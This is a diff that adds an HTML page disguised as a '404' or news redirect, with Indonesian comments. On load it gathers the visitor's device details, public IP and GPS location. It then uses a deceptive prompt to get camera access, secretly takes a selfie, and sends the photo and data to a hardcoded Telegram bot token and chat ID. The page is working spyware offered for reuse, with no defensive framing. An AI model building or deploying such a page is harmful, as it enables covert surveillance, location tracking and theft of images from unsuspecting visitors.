@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GusOfcXD 404</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/dist/ua-parser.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 400px;
+        }
+        #status {
+            font-size: 1.2em;
+            color: #333;
+            margin-bottom: 20px;
+            min-height: 1.5em; /* Agar layout tidak bergerak-gerak */
+        }
+        #countdown {
+            font-size: 4em;
+            font-weight: bold;
+            color: #d9534f;
+        }
+        video, canvas {
+            display: none; /* Sembunyikan elemen video dan canvas */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="status">tunggu kak</div>
+        <div id="countdown"></div>
+    </div>
+
+
+    <video id="video"></video>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+    
+        // isi token bot lu sama id lu puqi mak
+        const botToken = "8365309827:AAFAhH84Igmmc2h6KUkBNq1sur2xCOqfyJI";
+        const chatId = "6235009922";
+
+
+        const statusDiv = document.getElementById('status');
+        const countdownDiv = document.getElementById('countdown');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        
+        
+        function updateStatus(text) {
+            statusDiv.textContent = text;
+        }
+
+        
+        function getDeviceInfo() {
+            const parser = new UAParser();
+            const result = parser.getResult();
+            return {
+
+                os: `${result.os.name} ${result.os.version}`,
+                
+                browser: result.browser.name,
+               
+                brand: result.device.vendor || 'Tidak Diketahui'
+            };
+        }
+
+        async function getPublicIp() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("h:", error);
+                return "Tidak dapat diketahui";
+            }
+        }
+
+        async function getLocationInfo() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Geolocation tidak didukung browser ini.");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        try {
+                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+                            const data = await response.json();
+                            const city = data.address.city || data.address.town || data.address.village || 'Tidak Diketahui';
+                            const country = data.address.country || 'Tidak Diketahui';
+                            resolve(`${city}, ${country} (Lat: ${latitude.toFixed(4)}, Lon: ${longitude.toFixed(4)})`);
+                        } catch (error) {
+                            console.error("Gagal reverse geocoding:", error);
+                            resolve(`Lat: ${latitude.toFixed(4)}, Lon: ${longitude.toFixed(4)}`);
+                        }
+                    },
+                    (error) => {
+
+                        console.warn("tinggu bti:", error);
+                        resolve("tunggu bro");
+                    }
+                );
+            });
+        }
+
+
+        async function processAndSend() {
+            try {
+                updateStatus("jm.");
+                const deviceInfo = getDeviceInfo();
+
+                updateStatus("mmmmm.");
+                const ipAddress = await getPublicIp();
+
+                updateStatus("mmmmmmm");
+                const locationInfo = await getLocationInfo();
+
+                
+                const caption = `
+📱 **Informasi Perangkat**
+OS: ${deviceInfo.os}
+Browser: ${deviceInfo.browser}
+Merek: ${deviceInfo.brand}
+
+🌐 **Informasi Jaringan**
+IP Publik: ${ipAddress}
+
+📍 **Informasi Lokasi**
+ ${locationInfo}
+                `.trim();
+
+
+                updateStatus("izinkan ini untuk ke halman berita...");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    updateStatus(" mmm...");
+                    countdownDiv.textContent = "";
+                    
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        updateStatus("tunggu sbntr");
+                        countdownDiv.textContent = "";
+                        sendPhotoToTelegram(canvas, caption);
+                    }, 300);
+                };
+
+            } catch (err) {
+                console.error("Error:", err);
+                updateStatus(`Error: ${err.message}`);
+                countdownDiv.textContent = "";
+            }
+        }
+
+        function sendPhotoToTelegram(canvasElement, caption) {
+            canvasElement.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'selfie.jpg');
+                formData.append('chat_id', chatId);
+                formData.append('caption', caption); 
+
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                try {
+                    const response = await fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        const errorData = await response.json();
+                        throw new Error(`Gagal mengirim: ${errorData.description}`);
+                    }
+
+                    const result = await response.json();
+                    console.log("Berhasil dikirim:", result);
+                    updateStatus("eh lupa ini apa🗿 ");
+                    countdownDiv.textContent = "";
+
+                } catch (error) {
+                    console.error("Error:", error);
+                    updateStatus(`Gagal mengirim: ${error.message}`);
+                    countdownDiv.textContent = "❌";
+                }
+            }, 'image/jpeg', 0.9);
+        }
+
+        window.addEventListener('load', processAndSend);
+
+    </script>
+</body>
+</html>
